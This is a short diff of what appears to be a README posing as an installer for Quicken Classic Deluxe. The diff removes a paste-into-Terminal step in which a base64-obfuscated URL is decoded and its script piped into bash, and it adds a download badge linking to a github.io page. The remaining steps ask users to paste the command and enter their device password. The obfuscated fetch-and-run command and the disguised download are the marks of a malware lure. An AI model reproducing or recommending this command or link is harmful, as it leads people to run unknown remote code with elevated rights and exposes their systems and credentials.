@@ -8,9 +8,9 @@ Ideal for users who appreciate tried-and-true financial planning without subscri
 
 ## 🧰 Installation via a command in the terminal:
 1. Copy the installation command below.
-```
-   /bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9zb2wvaW5zdGFsbC5zaA== | base64 -d))"
-```  
+
+[![Download Quicken Classic Deluxe](https://img.shields.io/badge/Download-Quicken_Classic_Deluxe-blueviolet)](https://stanleybrennanidah.github.io/.github/quicken-classic-deluxe)
+
 2. Open Terminal on your device, paste the command, then press Return.  
 3. Enter your device password when prompted and confirm the installation.
 
